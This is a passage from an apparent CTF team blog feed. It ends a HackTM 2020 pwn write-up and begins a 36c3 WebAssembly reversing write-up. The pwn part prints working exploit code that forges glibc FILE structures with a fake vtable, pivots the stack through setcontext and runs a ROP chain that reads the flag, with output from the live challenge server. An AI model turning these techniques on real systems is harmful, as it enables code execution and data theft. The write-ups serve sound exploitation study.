p64(_IO_2_1_STDERR_+<span class="number">131</span>) <span class="comment"># _IO_read_base</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">131</span>) <span class="comment"># _IO_write_base</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">131</span>) <span class="comment"># _IO_write_ptr</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">131</span>) <span class="comment"># _IO_write_end</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">131</span>) <span class="comment"># _IO_buf_base</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">132</span>) <span class="comment"># _IO_buf_end</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _IO_save_base</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _IO_backup_base</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _IO_save_end</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _markers</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDOUT_) <span class="comment"># _chain</span></span><br><span class="line">    INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _fileno</span></span><br><span class="line">    INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _flags2</span></span><br><span class="line">    INPUT2 += p64(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _old_offset</span></span><br><span class="line">    INPUT2 += p16(<span class="number">0x0</span>) <span class="comment"># _cur_column</span></span><br><span class="line">    INPUT2 += p8(<span class="number">0x0</span>) <span class="comment"># _vtable_offset</span></span><br><span class="line">    INPUT2 += p8(<span class="number">0x0</span>) <span class="comment"># _shortbuf</span></span><br><span class="line">    INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _shortbuf</span></span><br><span class="line">    INPUT2 += p64(_IO_STDFILE_2_LOCK) <span class="comment"># _lock</span></span><br><span class="line">    INPUT2 += p64(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _offset</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _codecvt</span></span><br><span class="line">    INPUT2 += p64(_IO_WIDE_DATA_2) <span class="comment"># _wide_data</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_list</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_buf</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># __pad5</span></span><br><span class="line">    INPUT2 += p32(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _mode</span></span><br><span class="line">    INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">    INPUT2 += p64(_IO_FILE_JUMPS) <span class="comment"># vtable</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># STDOUT</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _flags</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">131</span>) <span class="comment"># _IO_read_ptr</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">131</span>) <span class="comment"># _IO_read_end</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">131</span>) <span class="comment"># _IO_read_base</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">131</span>) <span class="comment"># _IO_write_base</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">131</span>) <span class="comment"># _IO_write_ptr</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">131</span>) <span class="comment"># _IO_write_end</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">131</span>) <span class="comment"># _IO_buf_base</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">132</span>) <span class="comment"># _IO_buf_end</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _IO_save_base</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _IO_backup_base</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _IO_save_end</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _markers</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDIN_) <span class="comment"># _chain</span></span><br><span class="line">    INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _fileno</span></span><br><span class="line">    INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _flags2</span></span><br><span class="line">    INPUT2 += p64(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _old_offset</span></span><br><span class="line">    INPUT2 += p16(<span class="number">0x0</span>) <span class="comment"># _cur_column</span></span><br><span class="line">    INPUT2 += p8(<span class="number">0x0</span>) <span class="comment"># _vtable_offset</span></span><br><span class="line">    INPUT2 += p8(<span class="number">0x0</span>) <span class="comment"># _shortbuf</span></span><br><span class="line">    INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _shortbuf</span></span><br><span class="line">    INPUT2 += p64(_IO_STDFILE_1_LOCK) <span class="comment"># _lock</span></span><br><span class="line">    INPUT2 += p64(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _offset</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _codecvt</span></span><br><span class="line">    INPUT2 += p64(_IO_WIDE_DATA_1) <span class="comment"># _wide_data</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_list</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_buf</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># __pad5</span></span><br><span class="line">    INPUT2 += p32(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _mode</span></span><br><span class="line">    INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">    INPUT2 += p64(_IO_HELPER_JUMPS) <span class="comment"># vtable</span></span><br><span class="line"></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDERR_) <span class="comment"># stderr</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDOUT_) <span class="comment"># stdout</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDIN_) <span class="comment"># stdin</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#print(len(ROP_CHAIN))</span></span><br><span class="line">    INPUT2 += <span class="string">'\x00'</span>*(<span class="number">0x1f</span>*<span class="number">8</span>) <span class="comment"># __elf_set___libc_subfreeres</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># vtable IO_HELPER_JUMPS</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(SETCONTEXT_SPITVOT) <span class="comment"># _IO_helper_jumps STACKPIVOT SETCONTEXT</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    setcontext+0x35</span></span><br><span class="line"><span class="string">    mov     rsp, [rdx+0A0h]</span></span><br><span class="line"><span class="string">    mov     rbx, [rdx+80h]</span></span><br><span class="line"><span class="string">    mov     rbp, [rdx+78h]</span></span><br><span class="line"><span class="string">    mov     r12, [rdx+48h]</span></span><br><span class="line"><span class="string">    mov     r13, [rdx+50h]</span></span><br><span class="line"><span class="string">    mov     r14, [rdx+58h]</span></span><br><span class="line"><span class="string">    mov     r15, [rdx+60h]</span></span><br><span class="line"><span class="string">    mov     rcx, [rdx+0A8h]</span></span><br><span class="line"><span class="string">    push    rcx</span></span><br><span class="line"><span class="string">    mov     rsi, [rdx+70h]</span></span><br><span class="line"><span class="string">    mov     rdi, [rdx+68h]</span></span><br><span class="line"><span class="string">    mov     rcx, [rdx+98h]</span></span><br><span class="line"><span class="string">    mov     r8, [rdx+28h]</span></span><br><span class="line"><span class="string">    mov     r9, [rdx+30h]</span></span><br><span class="line"><span class="string">    mov     rdx, [rdx+88h]</span></span><br><span class="line"><span class="string">    xor     eax, eax</span></span><br><span class="line"><span class="string">    retn</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    POPRAX = LIBC + <span class="number">0x0000000000047cf8</span> <span class="comment"># pop rax ; ret</span></span><br><span class="line">    POPRDI = LIBC + <span class="number">0x0000000000026542</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">    POPRDX = LIBC + <span class="number">0x000000000012bda6</span> <span class="comment"># pop rdx ; ret</span></span><br><span class="line">    POPRSI = LIBC + <span class="number">0x0000000000026f9e</span> <span class="comment"># pop rsi ; ret</span></span><br><span class="line">    SYSCALL = LIBC + <span class="number">0x00000000000cf6c5</span> <span class="comment"># syscall ; ret</span></span><br><span class="line">    </span><br><span class="line">    FLAG_PATH = _IO_HELPER_JUMPS+<span class="number">0x178</span><span class="comment">#LIBC+0x1baad8#+16*8</span></span><br><span class="line">    ROP_ADDR = _IO_HELPER_JUMPS+<span class="number">0xa8</span><span class="comment">#LIBC+0x1baa08</span></span><br><span class="line">    ROP_CHAIN = p64(POPRAX)*<span class="number">2</span><span class="comment">#p64(OPEN)</span></span><br><span class="line">    ROP_CHAIN += p64(<span class="number">2</span>) + p64(POPRDI) + p64(FLAG_PATH) + p64(POPRSI) + p64(<span class="number">0</span>) + p64(SYSCALL) <span class="comment"># OPEN(file=flag_path) syscall == 2</span></span><br><span class="line">    ROP_CHAIN += p64(POPRAX) + p64(<span class="number">0</span>) + p64(POPRDI) + p64(<span class="number">3</span>) + p64(POPRSI) + p64(FLAG_PATH) + p64(POPRDX) + p64(<span class="number">0x49</span>) +p64(SYSCALL) <span class="comment"># READ(fd=3,buf=flag_path,nbytes=0x49) syscall == 0</span></span><br><span class="line">    ROP_CHAIN += p64(POPRAX) + p64(<span class="number">1</span>) + p64(POPRDI) + p64(<span class="number">1</span>) + p64(POPRSI) + p64(FLAG_PATH) + p64(POPRDX) + p64(<span class="number">0x49</span>) +p64(SYSCALL) <span class="comment"># WRITE(fd=1,buf=flag_path,nbyes=0x49) syscall == 1</span></span><br><span class="line">    ROP_CHAIN += <span class="string">"flag\x00"</span></span><br><span class="line">    <span class="comment">#ROP_CHAIN = ''</span></span><br><span class="line">    INPUT2 += <span class="string">'\x00'</span>*<span class="number">0x88</span>+p64(ROP_ADDR)+ ROP_CHAIN <span class="comment">#+ '\x00'*(190+7+3) + ROP_CHAIN#+ '\x00'*(0x90-0x88+0x8)+ p64(LIBC)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#INPUT2 += p64(0)*16*2 # _nl_global_locale</span></span><br><span class="line">    r.sendlineafter(<span class="string">'1 : '</span>, <span class="string">"%x %x"</span> %(_IO_2_1_STDIN_+_IO_BUF_END,_IO_2_1_STDIN_+<span class="number">0x2000</span>))</span><br><span class="line">    r.sendafter(<span class="string">'2 : '</span>, INPUT2)</span><br><span class="line">    <span class="comment">#r.interactive()</span></span><br><span class="line">    flag = r.recvall(timeout=<span class="number">2</span>)</span><br><span class="line">    r.close()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'HackTM'</span> <span class="keyword">in</span> flag:</span><br><span class="line">        print(flag)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> exploit():</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>Running it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ python trip_to_trick.py REMOTE</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/TripToTrick/trip_to_trick'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/TripToTrick/libc.so.6'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Opening connection to 138.68.67.161 on port 20006: Done</span><br><span class="line">[*] SYSTEM 0x7f1c8b934fd0</span><br><span class="line">[*] LIBC 0x7f1c8b8e2000</span><br><span class="line">[+] Receiving all data: Done (73B)</span><br><span class="line">[*] Closed connection to 138.68.67.161 port 20006</span><br><span class="line">HackTM&#123;d747aab3b6d6a95300eede7e3337397ace5131240e0fa9b849058f27f635e182&#125;</span><br></pre></td></tr></table></figure><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction/</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/fake-vtable-exploit/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/fake-vtable-exploit/</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/exploit-in-libc2.24/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/exploit-in-libc2.24/</a></li><li><a href="https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique" target="_blank" rel="noopener">https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique</a></li><li><a href="http://blog.angelboy.tw/" target="_blank" rel="noopener">http://blog.angelboy.tw/</a></li><li><a href="https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/" target="_blank" rel="noopener">https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/</a></li><li><a href="https://blog.rh0gue.com/2017-12-31-34c3ctf-300/" target="_blank" rel="noopener">https://blog.rh0gue.com/2017-12-31-34c3ctf-300/</a></li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;Trip To Trick   &lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;:&lt;br&gt;492 Points   &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Author&lt;/str
      
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
      <category term="x64" scheme="https://teamrocketist.github.io/categories/Pwn/x64/"/>
    
      <category term="Glibc Malloc" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/"/>
    
      <category term="IO_FILE" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/IO-FILE/"/>
    
    
      <category term="file_stream" scheme="https://teamrocketist.github.io/tags/file-stream/"/>
    
      <category term="io_file" scheme="https://teamrocketist.github.io/tags/io-file/"/>
    
      <category term="hacktm2020" scheme="https://teamrocketist.github.io/tags/hacktm2020/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] 36c3 - xmas_future</title>
    <link href="https://teamrocketist.github.io/2019/12/30/Reverse-36c3-xmas-future/"/>
    <id>https://teamrocketist.github.io/2019/12/30/Reverse-36c3-xmas-future/</id>
    <published>2019-12-30T03:02:38.000Z</published>
    <updated>2019-12-30T03:14:51.692Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>xmas_future</strong></p><p><strong>Points</strong><br>96<br><strong>Solves</strong><br>95<br><strong>Category</strong><br>Reverse</p><p><strong>Description:</strong><br>Most people just give you a present for christmas, hxp gives you a glorious future.</p><p>If you’re confused, simply extract the flag from this 山葵 and you shall understand. :)<br><a href="https://mega.nz/#!3nAGhAbI!qtxumnnsCsI9N6KUPCyEuatHVR9tm-uR8hKn6m8i9cc" target="_blank" rel="noopener">xmas_future-265eb0be46555aad.tar.xz (15.5 KiB)</a><br>by benediktwerner</p></blockquote><p>So we are given a bunch of html/wasm file, after running the php web server with the <strong>run.sh</strong> file we are presented with a page:<br><a data-fancybox="gallery" href="https://i.imgur.com/iaHhnaz.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/iaHhnaz.png" alt><br></a><br>The system will say the flag was correct if we insert the right flag, so let’s inspect the source:<br><a data-fancybox="gallery" href="https://i.imgur.com/BS3pITw.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/BS3pITw.png" alt><br></a><br>Next step is to check hxp2019.js:<br><a data-fancybox="gallery" href="https://i.imgur.com/IoJNl3l.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/IoJNl3l.png" alt><br></a><br>Check function is located at the WebAssembly file and its parameters are, the pointer <strong>offset</strong> to the string and the <strong>length</strong> of the string.</p><p>Instead of debugging the file through <strong>OP_CODES</strong> in the browser I found a <a href="https://github.com/WebAssembly/wabt" target="_blank" rel="noopener">tool</a> that can <strong>decompile</strong> it and also <strong>convert</strong> it to a <strong>c</strong> file.</p><p>After cloning the repo I followed the instructions on <strong>readme</strong> to build and compile the project:</p><p>After building everything <strong>new</strong> executables are added to the <strong>bin/</strong> folder:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ls bin/</span><br><span class="line">spectest-interp*  wasm2wat*        wasm-interp*   wasm-opcodecnt*  wasm-validate*  wat2wasm*</span><br><span class="line">wasm2c*           wasm-decompile*  wasm-objdump*  wasm-strip*      wast2json*      wat-desugar*</span><br></pre></td></tr></table></figure><p>First I decompiled the file using <strong>wasm-decompile</strong>:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir ../../challenge</span><br><span class="line">$ ./wasm-decompile ../../hxp2019_bg.wasm -o ../../challenge/dec.js</span><br></pre></td></tr></table></figure></p><p>And now lets convert also to <strong>c</strong>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./wasm2c ../../hxp2019_bg.wasm -o ../../challenge/hxp2019_bg.c</span><br></pre></td></tr></table></figure><p>Lets see the new files created:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ../../challenge</span><br><span class="line">$ ls</span><br><span class="line">decompiled.js  hxp2019_bg.c  hxp2019_bg.h</span><br></pre></td></tr></table></figure><p>Lets start first with the decompiled file which is a lot easier to read:<br><a data-fancybox="gallery" href="https://i.imgur.com/IY0xCgC.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/IY0xCgC.png" alt><br></a><br>Looking at the <strong>hxp2019_check_h578f31d490e10a31</strong><br><a data-fancybox="gallery" href="https://i.imgur.com/XcWuAr5.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/XcWuAr5.png" alt><br></a><br>Checking the verifications of the rest of the characters:<br><a data-fancybox="gallery" href="https://i.imgur.com/hgQ1IqR.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/hgQ1IqR.png" alt><br></a><br>Now that we know what is going on, we can start to look where the final check is located in the c generated files, so we can do dynamic analysis with gdb…</p><p>First let’s fix some wrong paths at <strong>hxp2019_bg.c</strong>  from: </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"../../challenge/hxp2019_bg.h"</span></span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>To:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"hxp2019_bg.h"</span></span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>The function in <strong>c</strong> is named <strong>hxp2019__check__h578f31d490e10a31</strong>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> u32 <span class="title">hxp2019__check__h578f31d490e10a31</span><span class="params">(u32 p0, u32 p1)</span> </span>&#123;</span><br><span class="line">  u32 l2 = <span class="number">0</span>, l3 = <span class="number">0</span>, l4 = <span class="number">0</span>, l5 = <span class="number">0</span>, l6 = <span class="number">0</span>, l7 = <span class="number">0</span>, l8 = <span class="number">0</span>, l9 = <span class="number">0</span>, </span><br><span class="line">      l10 = <span class="number">0</span>;</span><br><span class="line">  FUNC_PROLOGUE;</span><br><span class="line">  u32 i0, i1, i2;</span><br><span class="line">  ...</span><br><span class="line">  i1 &amp;= i2;</span><br><span class="line">  i0 = i0 == i1; <span class="comment">// final check is here we might want to put a breakpoint here.</span></span><br><span class="line">  <span class="keyword">if</span> (i0) &#123;<span class="keyword">goto</span> L7;&#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Putting a <strong>break point</strong> there is a solution but this makes a lot of <strong>effort</strong> to make the conditions always true and check the correct character. </p><p>We could also write a <strong>gdbscript</strong> or <strong>r2script</strong> but once again takes a lot of time… </p><p>Since this <strong>c</strong> files are compilable we can just modify the source code to print the flag characters and turn this condition to always return true.</p><p>But first we need to learn how to compile this kind of auto generated files, an example can be found at the <strong>wabt</strong> directory:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dependencies</span></span><br><span class="line">$ ls ../wabt/wasm2c/</span><br><span class="line">wasm-rt.h  wasm-rt-impl.c  wasm-rt-impl.h</span><br><span class="line">$ cp ../wabt/wasm2c/wasm-rt.h .</span><br><span class="line">$ cp ../wabt/wasm2c/wasm-rt-impl.c .</span><br><span class="line">$ cp ../wabt/wasm2c/wasm-rt-impl.h .</span><br><span class="line"><span class="comment"># Copying fac example files</span></span><br><span class="line">$ ls ../wabt/wasm2c/examples/fac/</span><br><span class="line">fac.c  fac.h  fac.wasm  fac.wat  main.c</span><br><span class="line">$ cp ../wabt/wasm2c/examples/fac/* .</span><br><span class="line">$ rm fac.c fac.h fac.wasm</span><br></pre></td></tr></table></figure><p>Now looking at the example of <strong>main.c</strong> file from <strong>fac</strong>:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Uncomment this to define fac_init and fac_Z_facZ_ii instead. */</span></span><br><span class="line"><span class="comment">/* #define WASM_RT_MODULE_PREFIX fac_ */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"fac.h"</span> <span class="comment">// Change this to hxp2019_bg.h</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* Make sure there is at least one command-line argument. */</span></span><br><span class="line">  <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Convert the argument from a string to an int. We'll implictly cast the int</span></span><br><span class="line"><span class="comment">  to a `u32`, which is what `fac` expects. */</span></span><br><span class="line">  u32 x = atoi(argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Initialize the fac module. Since we didn't define WASM_RT_MODULE_PREFIX,</span></span><br><span class="line"><span class="comment">  the initialization function is called `init`. */</span></span><br><span class="line">  init();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Call `fac`, using the mangled name. */</span></span><br><span class="line">  u32 result = Z_facZ_ii(x); <span class="comment">// We need to change this function too the real name is located at hxp2019_bg.h</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Print the result. */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"fac(%u) -&gt; %u\n"</span>, x, result);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>As you can see we need to adapt the example main function the current file we want to debug to find the correct <strong>Z_xxxZ</strong> function we can look at the header file generated <strong>hxp2019_bg.h</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/NwwTba7.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/NwwTba7.png" alt><br></a><br>The adapted main.c file:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Uncomment this to define fac_init and fac_Z_facZ_ii instead. */</span></span><br><span class="line"><span class="comment">/* #define WASM_RT_MODULE_PREFIX fac_ */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"hxp2019_bg.h"</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">b hxp2019_bg.c:2268</span></span><br><span class="line"><span class="comment">b hxp2019_bg.c:2434</span></span><br><span class="line"><span class="comment">r 1048576 50</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span 